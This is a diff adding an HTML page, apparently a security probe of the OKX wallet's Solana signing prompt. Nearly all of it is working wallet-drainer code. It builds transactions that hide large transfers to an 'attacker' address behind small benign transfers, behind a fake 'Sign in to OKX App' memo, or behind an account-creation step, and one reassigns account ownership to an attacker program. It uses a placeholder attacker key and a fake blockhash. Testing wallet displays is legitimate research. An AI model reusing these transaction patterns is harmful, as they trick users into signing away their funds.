@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>OKX_MULTI_TX_v7</title>
+<style>
+body{font-family:monospace;font-size:12px;padding:6px;background:#fff;color:#000}
+button{padding:11px;margin:5px 0;font-size:13px;background:#0066cc;color:#fff;border:0;display:block;width:100%;border-radius:6px}
+.danger{background:#cc0000}
+.crit{background:#660000}
+pre{background:#eee;padding:4px;font-size:10px;white-space:pre-wrap;word-break:break-all;height:280px;overflow:auto;border:1px solid #999;margin:0}
+</style>
+<script type="module">
+  try {
+    const w3 = await import("https://esm.sh/@solana/web3.js@1.95.3");
+    window._sol = w3;
+    document.getElementById("out").textContent = (new Date().toISOString().substr(11,12)) + " web3.js loaded\n" + document.getElementById("out").textContent;
+  } catch(e) {
+    document.getElementById("out").textContent = (new Date().toISOString().substr(11,12)) + " web3.js FAIL: " + e.message + "\n" + document.getElementById("out").textContent;
+  }
+</script>
+</head><body>
+<h2 style="margin:4px 0">OKX Multi-Tx Probe v7</h2>
+<pre id="out">click a button</pre>
+<button onclick="connect()">[0] connect Solana</button>
+<button onclick="m1_dual_transfer()" class="danger">[M1] DUAL transfer: 0.001 SOL to A + 0.999 SOL to attacker B</button>
+<button onclick="m2_memo_drain()" class="crit">[M2] MEMO("Sign in to App") + transfer 1 SOL to attacker</button>
+<button onclick="m3_createAcct_drain()" class="crit">[M3] CreateAccount + transfer drain</button>
+<button onclick="m4_pure_memo()" class="danger">[M4] PURE memo only (no transfer) — what title?</button>
+<button onclick="m5_assign()" class="crit">[M5] Assign account to attacker program</button>
+<button onclick="m6_versioned()" class="crit">[M6] VersionedTransaction (v0) + multiple instructions</button>
+<button onclick="m7_three_transfers()" class="danger">[M7] THREE transfers: 0.001 + 0.001 + 1 SOL drain (which one shown?)</button>
+
+<script>
+var out = document.getElementById("out");
+function log(t){ out.textContent = (new Date().toISOString().substr(11,12)) + " " + t + "\n" + out.textContent; }
+
+const ATTACKER = "ATokenwy1tFwbeT7s3CQwMkdLMfFgQDPNYSC1xUUfo3";  // 32-byte placeholder
+const BENIGN_DEST = "1nc1nerator11111111111111111111111111111111";
+const FAKE_BLOCKHASH = "11111111111111111111111111111112";
+
+async function ensureConnected(){
+  var ow = window.okxwallet;
+  if(!ow.solana.publicKey){ await ow.solana.connect(); }
+  return new window._sol.PublicKey(ow.solana.publicKey.toString());
+}
+
+async function connect(){
+  try{
+    var pk = await ensureConnected();
+    log("CONNECTED: " + pk.toString());
+  }catch(e){ log("ERR: " + e.message); }
+}
+
+async function m1_dual_transfer(){
+  log("=== [M1] DUAL transfer ===");
+  try{
+    if(!window._sol){ log("no web3.js"); return; }
+    var from = await ensureConnected();
+    var tx = new window._sol.Transaction();
+    // Instruction 1: small benign-looking transfer
+    tx.add(window._sol.SystemProgram.transfer({fromPubkey:from,toPubkey:new window._sol.PublicKey(BENIGN_DEST),lamports:1000000}));  // 0.001 SOL
+    // Instruction 2: drain to attacker
+    tx.add(window._sol.SystemProgram.transfer({fromPubkey:from,toPubkey:new window._sol.PublicKey(ATTACKER),lamports:999000000}));  // 0.999 SOL
+    tx.recentBlockhash = FAKE_BLOCKHASH;
+    tx.feePayer = from;
+    log("Built 2-instr tx. Calling signTransaction...");
+    var t0 = Date.now();
+    var signed = await window.okxwallet.solana.signTransaction(tx);
+    log("SIGNED ("+(Date.now()-t0)+"ms): sigs=" + signed.signatures.length);
+  }catch(e){ log("ERR: " + e.message); }
+}
+
+async function m2_memo_drain(){
+  log("=== [M2] MEMO + drain ===");
+  try{
+    if(!window._sol){ log("no web3.js"); return; }
+    var from = await ensureConnected();
+    var tx = new window._sol.Transaction();
+    // Memo program: "Sign in to OKX App"
+    var memoData = new TextEncoder().encode("Sign in to OKX App for verification");
+    tx.add(new window._sol.TransactionInstruction({
+      keys:[{pubkey:from,isSigner:true,isWritable:false}],
+      programId: new window._sol.PublicKey("MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr"),
+      data: memoData
+    }));
+    // Drain transfer
+    tx.add(window._sol.SystemProgram.transfer({fromPubkey:from,toPubkey:new window._sol.PublicKey(ATTACKER),lamports:1000000000}));
+    tx.recentBlockhash = FAKE_BLOCKHASH;
+    tx.feePayer = from;
+    log("Built memo+drain. signTransaction...");
+    var t0 = Date.now();
+    var signed = await window.okxwallet.solana.signTransaction(tx);
+    log("SIGNED ("+(Date.now()-t0)+"ms): sigs=" + signed.signatures.length);
+  }catch(e){ log("ERR: " + e.message); }
+}
+
+async function m3_createAcct_drain(){
+  log("=== [M3] CreateAccount + drain ===");
+  try{
+    if(!window._sol){ log("no web3.js"); return; }
+    var from = await ensureConnected();
+    var newAcct = window._sol.Keypair.generate();
+    var tx = new window._sol.Transaction();
+    tx.add(window._sol.SystemProgram.createAccount({
+      fromPubkey: from,
+      newAccountPubkey: newAcct.publicKey,
+      lamports: 100000,
+      space: 10,
+      programId: window._sol.SystemProgram.programId
+    }));
+    tx.add(window._sol.SystemProgram.transfer({fromPubkey:from,toPubkey:new window._sol.PublicKey(ATTACKER),lamports:1000000000}));
+    tx.recentBlockhash = FAKE_BLOCKHASH;
+    tx.feePayer = from;
+    log("Built createAcct+drain. signTransaction...");
+    var t0 = Date.now();
+    var signed = await window.okxwallet.solana.signTransaction(tx);
+    log("SIGNED ("+(Date.now()-t0)+"ms): sigs=" + signed.signatures.length);
+  }catch(e){ log("ERR: " + e.message); }
+}
+
+async function m4_pure_memo(){
+  log("=== [M4] PURE memo (no transfer) ===");
+  try{
+    if(!window._sol){ log("no web3.js"); return; }
+    var from = await ensureConnected();
+    var tx = new window._sol.Transaction();
+    var memoData = new TextEncoder().encode("Verify wallet ownership for OKX");
+    tx.add(new window._sol.TransactionInstruction({
+      keys:[{pubkey:from,isSigner:true,isWritable:false}],
+      programId: new window._sol.PublicKey("MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr"),
+      data: memoData
+    }));
+    tx.recentBlockhash = FAKE_BLOCKHASH;
+    tx.feePayer = from;
+    log("Built pure memo. signTransaction...");
+    var t0 = Date.now();
+    var signed = await window.okxwallet.solana.signTransaction(tx);
+    log("SIGNED ("+(Date.now()-t0)+"ms): sigs=" + signed.signatures.length);
+  }catch(e){ log("ERR: " + e.message); }
+}
+
+async function m5_assign(){
+  log("=== [M5] Assign account to attacker program ===");
+  try{
+    if(!window._sol){ log("no web3.js"); return; }
+    var from = await ensureConnected();
+    var tx = new window._sol.Transaction();
+    tx.add(window._sol.SystemProgram.assign({
+      accountPubkey: from,
+      programId: new window._sol.PublicKey(ATTACKER)
+    }));
+    tx.recentBlockhash = FAKE_BLOCKHASH;
+    tx.feePayer = from;
+    log("Built assign. signTransaction...");
+    var t0 = Date.now();
+    var signed = await window.okxwallet.solana.signTransaction(tx);
+    log("SIGNED ("+(Date.now()-t0)+"ms): sigs=" + signed.signatures.length);
+  }catch(e){ log("ERR: " + e.message); }
+}
+
+async function m6_versioned(){
+  log("=== [M6] VersionedTransaction (v0) ===");
+  try{
+    if(!window._sol){ log("no web3.js"); return; }
+    var from = await ensureConnected();
+    var instrs = [
+      window._sol.SystemProgram.transfer({fromPubkey:from,toPubkey:new window._sol.PublicKey(BENIGN_DEST),lamports:1000000}),
+      window._sol.SystemProgram.transfer({fromPubkey:from,toPubkey:new window._sol.PublicKey(ATTACKER),lamports:999000000})
+    ];
+    var msg = new window._sol.TransactionMessage({
+      payerKey: from,
+      recentBlockhash: FAKE_BLOCKHASH,
+      instructions: instrs
+    }).compileToV0Message();
+    var vtx = new window._sol.VersionedTransaction(msg);
+    log("Built v0 tx. signTransaction...");
+    var t0 = Date.now();
+    var signed = await window.okxwallet.solana.signTransaction(vtx);
+    log("SIGNED ("+(Date.now()-t0)+"ms): " + (signed.signatures ? signed.signatures.length : "noSig"));
+  }catch(e){ log("ERR: " + e.message); }
+}
+
+async function m7_three_transfers(){
+  log("=== [M7] THREE transfers ===");
+  try{
+    if(!window._sol){ log("no web3.js"); return; }
+    var from = await ensureConnected();
+    var tx = new window._sol.Transaction();
+    tx.add(window._sol.SystemProgram.transfer({fromPubkey:from,toPubkey:new window._sol.PublicKey(BENIGN_DEST),lamports:1000000}));
+    tx.add(window._sol.SystemProgram.transfer({fromPubkey:from,toPubkey:new window._sol.PublicKey(BENIGN_DEST),lamports:1000000}));
+    tx.add(window._sol.SystemProgram.transfer({fromPubkey:from,toPubkey:new window._sol.PublicKey(ATTACKER),lamports:1000000000}));
+    tx.recentBlockhash = FAKE_BLOCKHASH;
+    tx.feePayer = from;
+    log("Built 3-instr. signTransaction...");
+    var t0 = Date.now();
+    var signed = await window.okxwallet.solana.signTransaction(tx);
+    log("SIGNED ("+(Date.now()-t0)+"ms): sigs=" + signed.signatures.length);
+  }catch(e){ log("ERR: " + e.message); }
+}
+</script></body></html>
